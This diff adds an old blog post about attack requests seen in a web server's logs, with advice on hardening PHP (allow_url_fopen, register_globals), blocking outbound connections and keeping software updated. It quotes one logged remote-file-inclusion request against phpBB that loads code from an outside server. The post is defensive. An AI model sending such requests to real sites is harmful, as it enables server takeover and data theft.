@@ -1,0 +1,11 @@
+{"title": "Running a web server is dangerous", "date": "2007-01-17 14:57:50", "description": "", "categories": ["off-topic", "security"], "slug": "running-a-web-server-is-dangerous"}
+
+	<p>I guess some of you run a web server. Maybe you have noticed entries like this one in your logs:</p>
+
+	<pre>&quot;GET /forum/admin/admin_styles.php?phpbb_root_path=http://some.server.name/0wn/mail.txt?%5d\r HTTP/1.1&quot; 302 5 &quot;-&quot; &quot;-&quot;</pre>
+
+	<p>What is this about? In this particular case somebody tried to use a security hole in an older phpBB version to execute <span class="caps">PHP</span> code loaded from another server. I had several hundreds of entries like this one in the last month, targeting vulnerabilities in all kinds of <span class="caps">PHP</span> scripts (most of which are not even installed here). The attackers tried to install backdoors, defacement tools or in one case a simple script to send all e-mail addresses from the local phpBB installation to its owner. The requests are usually done by other web servers, I guess those have the backdoor already installed (a botnet).</p>
+
+	<p>What can you do to protect yourself? Make sure to configure your <span class="caps">PHP</span> installation properly. First off all, disallow functions like fopen() or include() to load files from remote servers&nbsp;&mdash; set the option <a href="http://php.net/filesystem">allow_url_fopen=0</a>. Some of the attacks also depend on <span class="caps">URL</span> parameters being taken over as global variables, you should make sure that this security hole is closed as well: <a href="http://php.net/register_globals">register_globals=off</a>. Both settings can be set in php.ini as well as .htaccess files.</p>
+
+	<p>My hosting provider went one step further and reconfigured the firewall so that the server can no longer initiate connections into the internet. It was a little inconvenient when I had to ask for a configuration change so I could have a script connect to mozdev.org but the security gain is certainly worth it. And of course, you should not forget to upgrade the software you are running. Most developers offer you a mailing list you can subscribe to to get notified when a new version of a web script comes out.</p>
